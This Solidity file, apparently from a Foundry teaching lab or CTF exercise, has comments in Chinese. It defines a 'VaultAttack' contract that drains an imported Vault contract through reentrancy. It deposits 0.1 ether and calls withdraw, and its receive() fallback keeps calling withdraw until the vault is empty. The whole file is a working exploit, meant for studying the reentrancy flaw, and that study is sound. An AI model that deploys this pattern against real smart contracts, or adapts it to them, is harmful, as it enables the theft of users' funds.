// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Vault.sol";
import "forge-std/console.sol";

// 攻击合约
contract VaultAttack {
    Vault public vault;
    
    // 构造函数，传入被攻击合约地址
    constructor(address _vault) payable {
      //将被攻击合约地址转换为可支付地址（payable address），使其能接收 ETH
      //把地址类型，转换为可调用得合约实例
        vault = Vault(payable(_vault));
    }
    
    // 攻击函数
    function attack() external {
        // 存入资金
        vault.deposite{value: 0.1 ether}();
        // 开始提款
        vault.withdraw();
        // 输出攻击合约余额
        console.log("Attacker balance (ether): %d", address(this).balance / 1 ether);
    }
    
    // 接收ETH的回调函数，当本合约收到ETH时，会自动调用此函数实现重入攻击
    receive() external payable {
        // 继续调用withdraw函数，直到提取完所有资金
        vault.withdraw();
    }

    // 查看合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
} 